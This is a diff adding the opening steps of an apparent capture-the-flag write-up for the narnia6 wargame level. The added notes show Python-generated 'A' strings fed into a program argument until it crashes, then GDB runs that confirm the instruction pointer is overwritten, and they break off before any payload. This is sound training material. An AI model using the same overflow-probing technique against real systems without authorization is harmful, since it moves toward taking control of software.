@@ -36,3 +36,30 @@ int main(int argc, char *argv[]){
 	exit(1);
 }
 =============================================================
+I'm gonna try to overflow b2 
+narnia6@narnia:~$ /narnia/narnia6 B1 B2                                          
+B1
+narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*12')
+AAAA
+narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*15')
+AAAAAAA
+narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*16')
+Segmentation fault (core dumped)
+
+Oh! Let's fire up GDB
+
+(gdb) run B1 $(python -c'print "A"*16')
+Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048301 in ?? ()
+(gdb) run B1 $(python -c'print "A"*20')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 B1 $(python -c'print "A"*20')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+Nice! Now, where to point?
+
